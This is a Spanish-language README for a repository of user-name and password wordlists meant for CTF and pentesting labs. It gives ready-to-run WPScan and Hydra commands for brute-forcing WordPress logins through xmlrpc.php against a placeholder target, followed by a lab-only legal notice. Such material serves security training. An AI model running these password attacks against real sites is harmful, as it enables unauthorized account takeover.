# CTF Wordlists

Diccionarios de usuarios y contraseñas para ejercicios de pentesting y CTF.

## Archivos

| Archivo | Entradas | Descripción |
|---------|----------|-------------|
| `users.txt` | 1200 | Nombres de usuario comunes en servidores, aplicaciones web y redes corporativas |
| `passwords.txt` | ~1500 | Contraseñas comunes, variaciones típicas y patrones frecuentes |

## Uso con WPScan

```bash
# Descargar los diccionarios
wget https://raw.githubusercontent.com/TU_USUARIO/ctf-wordlists/main/users.txt
wget https://raw.githubusercontent.com/TU_USUARIO/ctf-wordlists/main/passwords.txt

# Ataque de fuerza bruta contra WordPress vía xmlrpc
wpscan --url http://TARGET/lab/ \
  --passwords passwords.txt \
  --usernames users.txt \
  --password-attack xmlrpc \
  --max-threads 50
```

## Uso con Hydra

```bash
hydra -L users.txt -P passwords.txt TARGET http-post-form \
  "/lab/xmlrpc.php:<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>^USER^</string></value></param><param><value><string>^PASS^</string></value></param></params></methodCall>:Incorrect username or password" \
  -t 50
```

## Aviso legal

Estos diccionarios son **exclusivamente para entornos de laboratorio educativos**.
No utilices estas herramientas ni técnicas contra sistemas sin autorización explícita.
